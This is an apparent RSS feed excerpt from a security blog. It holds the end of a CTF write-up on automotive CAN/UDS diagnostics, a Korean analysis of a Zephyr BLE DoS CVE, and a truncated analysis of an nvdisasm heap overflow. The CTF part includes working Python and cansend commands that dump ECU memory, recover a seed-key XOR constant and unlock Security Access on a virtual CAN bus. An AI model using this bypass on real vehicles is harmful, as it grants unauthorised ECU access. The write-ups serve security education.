<span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, dlc, datarecvdata = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    can_id_filter = <span class="hljs-number">0x7E8</span>    can_mask_filter = <span class="hljs-number">0xFFF</span>    can_filter = struct.pack(<span class="hljs-string">&quot;=II&quot;</span>, can_id_filter, can_mask_filter)    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_FILTER, can_filter)    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_RECV_OWN_MSGS, <span class="hljs-number">0</span>)    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    <span class="hljs-keyword">for</span> hex_value <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x1A000</span>, <span class="hljs-number">0x1B000</span>, <span class="hljs-number">0xFF</span>):        candata = <span class="hljs-string">b&quot;\x07\x23\x14&quot;</span> + hex_value.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;big&quot;</span>) + <span class="hljs-string">b&quot;\xff&quot;</span>                data1 = <span class="hljs-string">b&quot;\x02\x10\x02\x00\x00\x00\x00\x00&quot;</span>        frame1 = build_can_frame(<span class="hljs-number">0x7DF</span>, data1)        p.send(frame1)                frame_r1 = p.recv(<span class="hljs-number">16</span>)                frame2 = build_can_frame(<span class="hljs-number">0x7DF</span>, candata)        p.send(frame2)                frame_r2 = p.recv(<span class="hljs-number">16</span>)        can_id2, dlc2, data_r2 = dissect_can_frame(frame_r2)                recvdata += data_r2.hex()[<span class="hljs-number">6</span>:]                data3 = <span class="hljs-string">b&quot;\x30\x00\x00\x00\x00\x00\x00\x00&quot;</span>        frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)        p.send(frame3)                temp = <span class="hljs-number">0</span>        <span class="hljs-keyword">while</span> temp &lt; <span class="hljs-number">36</span>:            frame_r_loop = p.recv(<span class="hljs-number">16</span>)            can_id_loop, dlc_loop, data_loop = dissect_can_frame(frame_r_loop)                        tempdata = data_loop.hex()[<span class="hljs-number">2</span>:]                        <span class="hljs-keyword">if</span> tempdata != <span class="hljs-string">&quot;00000000000000&quot;</span>:                recvdata += tempdata            temp = temp + <span class="hljs-number">1</span>print(<span class="hljs-string">f&quot;recv data: <span class="hljs-subst">{recvdata}</span>&quot;</span>)</code></pre><p>First, write the code to perform a read operation on the memory in the <code>0x1A000</code> region.</p><p><img src="image26.png" alt="image26.png"></p><p>Previously, execute the code that authenticates Level 3 first to pass the Level 3 authentication.</p><p>After that, if you execute the memory read code you just wrote, you can confirm that a 4-byte value exists twice. You can confirm that this value changes every time a seed value is generated through a security access Level 1 request.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0x983cb51b</span> ^ <span class="hljs-number">0xcd051f0c</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0xddee9870</span> ^ <span class="hljs-number">0x88d73267</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0x4a4499ad</span> ^ <span class="hljs-number">0x1f7d33ba</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span></code></pre><p>It can be seen that performing an XOR operation on those values results in a fixed value of <code>0x5539aa17</code>.</p><p>Through this, we can know that a key value calculated with the seed value exists in memory. And we can also know that the calculation algorithm is <code>seed ^ 0x5539aa17</code>.</p><p><img src="image28.png" alt="image27.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)</span>cansend vcan0 7E0<span class="hljs-comment">#021003</span><span class="hljs-comment"># 02(PCI:len) 27(SID:SecurityAccess) 01(Level)</span>cansend vcan0 7E0<span class="hljs-comment">#022701</span><span class="hljs-comment"># 06(PCI:len) 27(SID:SecurityAccess) 02(Level+1) KEYSKEYS</span>cansend vcan0 7E0<span class="hljs-comment">#062702KEYSKEYS</span></code></pre><p>When attempting Security Access Level 1 authentication using the discovered encryption algorithm, it can be seen that it succeeds, confirming the RSID (<code>67</code>).</p><pre><code class="hljs python"><span class="hljs-comment"># security access level 1 pass</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    data1 = <span class="hljs-string">b&quot;\x02\x10\x03\x00\x00\x00\x00\x00&quot;</span>    frame1 = build_can_frame(<span class="hljs-number">0x7E0</span>, data1)    p.send(frame1)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    data2 = <span class="hljs-string">b&quot;\x02\x27\x01\x00\x00\x00\x00\x00&quot;</span>    frame2 = build_can_frame(<span class="hljs-number">0x7E0</span>, data2)    p.send(frame2)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    seed_bytes = msg_data[<span class="hljs-number">3</span>:<span class="hljs-number">7</span>]    seed_int = int.from_bytes(seed_bytes, <span class="hljs-string">&apos;big&apos;</span>)    print(<span class="hljs-string">f&quot;Seed: <span class="hljs-subst">{seed_int:<span class="hljs-number">08</span>X}</span>&quot;</span>)    key_int = seed_int ^ <span class="hljs-number">0x5539AA17</span>    print(<span class="hljs-string">f&quot;Key: <span class="hljs-subst">{key_int:<span class="hljs-number">08</span>X}</span>&quot;</span>)    key_bytes = key_int.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&apos;big&apos;</span>)    data3 = <span class="hljs-string">b&quot;\x06\x27\x02&quot;</span> + key_bytes    frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)    p.send(frame3)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    print(<span class="hljs-string">&quot;Security access level 1 unlock!&quot;</span>)</code></pre><p><img src="image28.png" alt="image28.png"></p><p>The code to unlock Security Access Level 1 can also be written.</p><p><img src="image29.jpg" alt="image29.jpg"></p><h2 id="4-CVEs-occurring-due-to-UDS-commands"><a href="#4-CVEs-occurring-due-to-UDS-commands" class="headerlink" title="4. CVEs occurring due to UDS commands"></a>4. CVEs occurring due to UDS commands</h2><p><img src="image30.jpg" alt="image30.jpg"></p><p>Security vulnerabilities can occur with UDS commands learned through the BlockHarbor CTF, and there are actual cases where CVEs are issued. A prime example is <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6347">CVE-2024-6347</a>, which occurred in the Nissan Altima.</p><p>CVE-2024-6347 is a case where a DoS vulnerability occurred via UDS commands. The DoS vulnerability was caused by unauthorized access to the ECU programming session in the blind spot detection sensor ECU firmware.</p><p>Furthermore, vulnerabilities through CAN/UDS can include Information Leakage through Read Data By Identifier Request (<code>22</code>) and various Diagnostic Requests (<code>19</code>, etc.), and the acquisition of ECU and in-vehicle privileges through Security Access (<code>27</code>) bypass. In particular, if validation for Read Memory By Address Request (<code>23</code>) is inadequate, the firmware can be leaked through internal memory access.</p><p>Therefore, rigorous validation of CAN/UDS messages and access control for security access can be said to be the most fundamental elements in vehicle security.</p><p>Next time, I will return with a different embedded topic! Thank you! &#x1F44B;&#x1F3FB;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/CAN/">CAN</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/UDS/">UDS</category>
      
      <category domain="https://hackyboiz.github.io/tags/VSEC/">VSEC</category>
      
      <category domain="https://hackyboiz.github.io/tags/automotive/">automotive</category>
      
      <category domain="https://hackyboiz.github.io/tags/blockharbor/">blockharbor</category>
      
      <category domain="https://hackyboiz.github.io/tags/car/">car</category>
      
      <category domain="https://hackyboiz.github.io/tags/vehicle/">vehicle</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-10456 : Zephyr RTOS의 BLE의 검증 미흡으로 인한 DoS</title>
      <link>https://hackyboiz.github.io/2025/11/19/poosic/cve-2025-10456/</link>
      <guid>https://hackyboiz.github.io/2025/11/19/poosic/cve-2025-10456/</guid>
      <pubDate>Wed, 19 Nov 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2025-10456&quot;&gt;NV</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-10456">NVD: CVE-2025-10456</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Zephyr RTOS&#xC758; BLE &lt;= v4.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-10456&#xC740; Zephyr RTOS&#xC758; BLE(Bluetooth Low Energy)&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; DoS &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Bluetooth &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xC2A4;&#xD0DD; &#xC0C1;&#xC5D0;&#xC11C; &#xBB3C;&#xB9AC;&#xACC4;&#xCE35;&#xACFC; &#xADF8; &#xC0C1;&#xC704;&#xACC4;&#xCE35; &#xAC04;&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; L2CAP &#xACC4;&#xCE35;&#xC5D0;&#xC11C; integer overflow&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xCF54;&#xB4DC;&#xB85C; &#xBD80;&#xD130; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6D0;&#xC778;&#xC774; &#xB41C; &#xCF54;&#xB4DC;&#xB294; BLE&#xC758; L2CAP &#xCC98;&#xB9AC; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Bluetooth&#xC5D0;&#xC11C;&#xB294; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBA70; BLE&#xC5D0;&#xC11C;&#xB9CC; &#xD2B8;&#xB9AC;&#xAC70;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB41C; &#xACF3;&#xC740; L2CAP Flow Control Credit Indication &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; l2cap.c&#xC758; <code>le_credits()</code> &#xD568;&#xC218; &#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">le_credits</span><span class="hljs-params">(struct bt_l2cap *l2cap, <span class="hljs-keyword">uint8_t</span> ident,</span></span><span class="hljs-function"><span class="hljs-params">       struct net_buf *buf)</span></span><span class="hljs-function"></span>{<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_conn</span> *<span class="hljs-title">conn</span> = <span class="hljs-title">l2cap</span>-&gt;<span class="hljs-title">chan</span>.<span class="hljs-title">chan</span>.<span class="hljs-title">conn</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_chan</span> *<span class="hljs-title">chan</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_le_credits</span> *<span class="hljs-title">ev</span> = (<span class="hljs-title">void</span> *)<span class="hljs-title">buf</span>-&gt;<span class="hljs-title">data</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_le_chan</span> *<span class="hljs-title">le_chan</span>;</span><span class="hljs-keyword">uint16_t</span> credits, cid;...cid = sys_le16_to_cpu(ev-&gt;cid);credits = sys_le16_to_cpu(ev-&gt;credits);le_chan = BT_L2CAP_LE_CHAN(chan);<span class="hljs-keyword">if</span> (atomic_get(&amp;le_chan-&gt;tx.credits) + credits &gt; UINT16_MAX) { <span class="hljs-comment">//[1] trigger point</span>LOG_ERR(<span class="hljs-string">&quot;Credits overflow&quot;</span>);bt_l2cap_chan_disconnect(chan); <span class="hljs-comment">//disconnect when integer overflow</span><span class="hljs-keyword">return</span>;}</code></pre><p>&#xCF54;&#xB4DC;&#xC758; <code>[1]</code>&#xC5D0;&#xC11C; <code>credits</code>&#xB294; 16&#xBE44;&#xD2B8; &#xD544;&#xB4DC;&#xC774;&#xBA70; <code>tx.credits</code>&#xB294; <code>atomic_t</code> &#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>tx.credits</code>+<code>credits</code>&#xC758; &#xAC12;&#xC774; 65,535 &#xC774;&#xC0C1;&#xC77C; &#xACBD;&#xC6B0; integer overflow&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>UINT16_MAX</code>&#xB97C; &#xD55C;&#xACC4;&#xAC12;&#xC73C;&#xB85C; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xD574;&#xB2F9; &#xCC44;&#xB110;&#xC758; &#xC5F0;&#xACB0;&#xC744; &#xC885;&#xB8CC;&#xC2DC;&#xD0A4;&#xAE30; &#xC704;&#xD574; <code>bt_l2cap_chan_disconnect()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bt_l2cap_chan_disconnect</span><span class="hljs-params">(struct bt_l2cap_chan *chan)</span></span><span class="hljs-function"></span>{<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_conn</span> *<span class="hljs-title">conn</span> = <span class="hljs-title">chan</span>-&gt;<span class="hljs-title">conn</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_buf</span> *<span class="hljs-title">buf</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_disconn_req</span> *<span class="hljs-title">req</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_le_chan</span> *<span class="hljs-title">le_chan</span>;</span><span class="hljs-keyword">if</span> (!conn) {<span class="hljs-keyword">return</span> -ENOTCONN;}<span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_BT_CLASSIC) &amp;&amp; <span class="hljs-comment">//[*]</span>    conn-&gt;type == BT_CONN_TYPE_BR) {<span class="hljs-keyword">return</span> bt_l2cap_br_chan_disconnect(chan);}le_chan = BT_L2CAP_LE_CHAN(chan);LOG_DBG(<span class="hljs-string">&quot;chan %p scid 0x%04x dcid 0x%04x&quot;</span>, chan, le_chan-&gt;rx.cid, le_chan-&gt;tx.cid);le_chan-&gt;ident = get_ident(); <span class="hljs-comment">// alloc new ID to channel</span>buf = l2cap_create_le_sig_pdu(BT_L2CAP_DISCONN_REQ,      le_chan-&gt;ident, <span class="hljs-keyword">sizeof</span>(*req));<span class="hljs-keyword">if</span> (!buf) {<span class="hljs-keyword">return</span> -ENOMEM;}req = net_buf_add(buf, <span class="hljs-keyword">sizeof</span>(*req)); <span class="hljs-comment">// [2] request packet struct</span>req-&gt;dcid = sys_cpu_to_le16(le_chan-&gt;tx.cid);req-&gt;scid = sys_cpu_to_le16(le_chan-&gt;rx.cid);l2cap_chan_send_req(chan, buf, L2CAP_DISC_TIMEOUT); <span class="hljs-comment">// [3] send disconnect msg</span>bt_l2cap_chan_set_state(chan, BT_L2CAP_DISCONNECTING);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC774;&#xD6C4; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xCF54;&#xB4DC; <code>[2]</code>&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xCC44;&#xB110;&#xC758; <code>tx.cid</code>, <code>rx.cid</code>&#xB97C; <code>req</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xB2F4;&#xC544; &#xC5F0;&#xACB0; &#xD574;&#xC81C;&#xB97C; &#xC704;&#xD55C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xCF54;&#xB4DC;&#xC758; <code>[3]</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;.</p><p>| &#xCF54;&#xB4DC;&#xC758; <code>[*]</code> &#xBD80;&#xBD84;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Bluetooth&#xC5D0;&#xB294; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">le_disconn_rsp</span><span class="hljs-params">(struct bt_l2cap *l2cap, <span class="hljs-keyword">uint8_t</span> ident,</span></span><span class="hljs-function"><span class="hljs-params">   struct net_buf *buf)</span></span><span class="hljs-function"></span>{<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_conn</span> *<span class="hljs-title">conn</span> = <span class="hljs-title">l2cap</span>-&gt;<span class="hljs-title">chan</span>.<span class="hljs-title">chan</span>.<span class="hljs-title">conn</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_le_chan</span> *<span class="hljs-title">chan</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_disconn_rsp</span> *<span class="hljs-title">rsp</span> = (<span class="hljs-title">void</span> *)<span class="hljs-title">buf</span>-&gt;<span class="hljs-title">data</span>;</span><span class="hljs-keyword">uint16_t</span> scid;<span class="hljs-keyword">if</span> (buf-&gt;len &lt; <span class="hljs-keyword">sizeof</span>(*rsp)) {LOG_ERR(<span class="hljs-string">&quot;Too small LE disconn rsp packet size&quot;</span>);<span class="hljs-keyword">return</span>;}scid = sys_le16_to_cpu(rsp-&gt;scid);LOG_DBG(<span class="hljs-string">&quot;dcid 0x%04x scid 0x%04x&quot;</span>, sys_le16_to_cpu(rsp-&gt;dcid), scid);chan = l2cap_remove_rx_cid(conn, scid);<span class="hljs-keyword">if</span> (!chan) {<span class="hljs-keyword">return</span>;}bt_l2cap_chan_del(&amp;chan-&gt;chan);}</code></pre><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xD6C4; request&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; <code>le_disonn_rsp()</code>&#xC5D0;&#xC11C; <code>cid</code> &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xACE0;&#xC815;&#xB41C; CID &#xAC12;&#xC744; &#xAC00;&#xC9C0;&#xB294; &#xC911;&#xC694;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;(LE SIGNAL CHANNEL, SMP, ATT &#x2026;)&#xC5D0; &#xB300;&#xD574; &#xC5F0;&#xACB0;&#xD574;&#xC81C;&#xAC00; &#xAC00;&#xB2A5;&#xD574;&#xC838; DoS &#xACF5;&#xACA9;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://elixir.bootlin.com/zephyr/v4.1.0/source/subsys/bluetooth/host/l2cap.c">Zephyr: l2cap.c</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/DoS/">DoS</category>
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/Zephyr/">Zephyr</category>
      
      <category domain="https://hackyboiz.github.io/tags/BLE/">BLE</category>
      
      <category domain="https://hackyboiz.github.io/tags/L2CAP/">L2CAP</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-10456/">CVE-2025-10456</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/19/poosic/cve-2025-10456/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-23271: NVIDIA nvdisasm의 heap overflow 취약점</title>
      <link>https://hackyboiz.github.io/2025/11/05/ogu123/cve-2025-23271/</link>
      <guid>https://hackyboiz.github.io/2025/11/05/ogu123/cve-2025-23271/</guid>
      <pubDate>Wed, 05 Nov 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2025-2191">https://talosintelligence.com/vulnerability_reports/TALOS-2025-2191</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NVIDIA nvdisasm 12.8.90</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NVIDIA nvdisasm&#xB294; CUDA toolkit&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xB3C4;&#xAD6C;&#xB85C; CUDA ELF &#xD30C;&#xC77C;&#xC758; disassembly, control low graphs, register life-ranges, debug &#xC815;&#xBCF4;&#xB97C; &#xD45C;&#xC2DC;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> uint16 Elf32_Half;<span class="hljs-keyword">typedef</span> uint32 Elf32_Word;<span class="hljs-keyword">typedef</span> uint32 Elf32_Addr;<span class="hljs-keyword">typedef</span> uint32 Elf32_Off;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    Elf32_Word sh_name;    Elf32_Word sh_type;    Elf32_Word sh_flags;    Elf32_Addr sh_addr;    Elf32_Off  sh_offset;    Elf32_Word sh_size;    Elf32_Word sh_link;    Elf32_Word sh_info;    Elf32_Word sh_addralign;    Elf32_Word sh_entsize;} Elf32_Shdr;</code></pre><p>ELF &#xD30C;&#xC77C;&#xC758; .reloc &#xC139;&#xC158;&#xC740; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB85C;&#xB4DC;&#xB420; &#xB54C; &#xD544;&#xC694;&#xD55C; &#xC7AC;&#xBC30;&#xCE58;(relocation) &#xC815;&#xBCF4;&#xB97C; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; nvdisasm&#xC774; 32bit ELF &#xD30C;&#xC77C;&#xC758; .reloc &#xC139;&#xC158;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xBA74;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-number">0045</span>c699  mov     rsi, qword [rsp {var_b8_1}]<span class="hljs-number">0045</span>c69d  mov     rdi, qword [rax+<span class="hljs-number">0x18</span>]<span class="hljs-number">0045</span>c6a1  shr     rsi, <span class="hljs-number">0x3</span>                     (<span class="hljs-number">1</span>) <span class="hljs-number">0045</span>c6a5  shl     rsi, <span class="hljs-number">0x4</span>                     (<span class="hljs-number">2</span>)<span class="hljs-number">0045</span><span class="hljs-function">c6a9  call    <span class="hljs-title">sub_40a610</span>                   <span class="hljs-params">(<span class="hljs-number">3</span>)</span></span></code></pre><p>nvdisasm&#xC740; ELF &#xD30C;&#xC77C;&#xC758; .reloc &#xC139;&#xC158;&#xC744; 0x45ada0 &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD30C;&#xC2F1; &#xD569;&#xB2C8;&#xB2E4;.</p><p>offset 0x45c699&#xC5D0;&#xC11C; &#xD604;&#xC7AC; .reloc &#xC139;&#xC158;&#xC758; <code>sh_size</code>&#xB97C; rsi &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB85C; &#xC62E;&#xAE30;&#xACE0; (1),(2)&#xB97C; &#xD1B5;&#xD574; <code>sh_size</code> &#xAC12;&#xC744; 2&#xBC30;&#xB85C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, <code>sh_size</code> &#xAC12;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xD06C;&#xAE30;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-number">0045</span>c07b  lea     r14, [rbx+rsi]               ...<span class="hljs-number">0045</span>c6ef  lea     rax, [r14+<span class="hljs-number">0x7</span>]               <span class="hljs-number">0045</span>c6f3  lea     rsi, [rbx+<span class="hljs-number">0x8</span>]               <span class="hljs-number">0045</span>c6f7  sub     rax, rsi                     ...<span class="hljs-number">0045</span>c6fa  mov     r8, rax     <span class="hljs-number">0045</span>c6fd  shr     r8, <span class="hljs-number">0x3</span>     <span class="hljs-number">0045</span>c701  add     r8, <span class="hljs-number">0x1</span>     ...<span class="hljs-number">0045</span>c70f  mov     rdi, r8     ...<span class="hljs-number">0045</span>c718  shr     rdi, <span class="hljs-number">0x2</span></code></pre><pre><code class="hljs cpp">loop_counter = (((sh_size<span class="hljs-number">-1</span>) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">2</span></code></pre><p>&#xC704; &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xB97C; &#xD574;&#xC11D;&#xD558;&#xBA74; <code>sh_size</code>(rsi)&#xC744; &#xD1B5;&#xD574; &#xBC18;&#xBCF5;&#xBB38; &#xCE74;&#xC6B4;&#xD2B8; &#xAC12;&#xC744; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-number">0045</span>c720  movdqu  xmm0, xmmword [rdx+<span class="hljs-number">0x10</span>]<span class="hljs-number">0045</span>c725  pxor    xmm6, xmm6<span 